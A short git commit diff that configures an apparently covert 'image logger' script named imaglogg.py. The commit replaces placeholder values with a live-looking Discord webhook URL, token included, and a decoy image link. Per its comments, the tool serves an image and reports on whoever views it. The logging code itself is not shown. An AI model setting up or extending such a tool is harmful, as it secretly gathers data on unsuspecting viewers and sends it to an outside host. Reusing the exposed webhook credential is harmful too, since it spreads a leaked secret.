13417f56a7a528a9b5373ca959243c8d6e74c224
jay <brayden11heldreth@gmail.com>
2025-02-15 17:57:36 -0600

    Update imaglogg.py

--- api/imaglogg.py
+++ api/imaglogg.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340471077666689055/lzLYByvOFehOuXIxqiNk9NWZEvO0cQ_5biSWSFcmPDoduQWvwnpKUIa_-NbnNtKaURAg",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJbW0ZRcWgKB0AiIbL-yaaQPGFH5jXIgUUvA&s.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
